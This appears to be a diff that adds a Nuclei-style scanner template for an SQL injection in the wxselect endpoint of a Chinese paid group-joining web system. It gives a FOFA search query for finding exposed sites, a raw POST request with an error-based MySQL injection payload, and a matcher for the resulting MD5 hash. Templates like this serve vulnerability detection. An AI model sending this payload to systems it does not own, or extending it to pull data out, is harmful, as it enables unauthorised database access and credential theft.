@@ -1,0 +1,31 @@
+id: 9kuai9-wxselect-sql
+
+info:
+  name: "九块九付费进群系统wxselect接口SQL注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/website/index/login.html"
+    九块九付费进群系统中的wxselect接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，绕过身份验证机制，直接访问数据库内容，包括但不限于管理员凭证及用户敏感信息。在特定权限条件下，攻击者可能进一步利用该漏洞在服务器上写入恶意代码，从而提升为系统级权限。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487713&idx=1&sn=d5cdc697ad0ac43e57cf0aec430f3b42&chksm=c267a5d2f5102cc47976208b855df0126ec5b48ecf14a179f10c5c622a1ba1c11b5c9469fa5e&token=1439003696&lang=zh_CN#rd
+  tags: 九块九付费进群系统
+
+
+http:
+- raw:
+  - |
+    POST /group/index/wxselect HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+    Content-Type: application/x-www-form-urlencoded
+
+    orderid=') AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(MD5(123456) AS NCHAR),0x7e)),1,190))),5417)-- ylIU
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949ba59abbe56e057f20f883e'
+
+
+
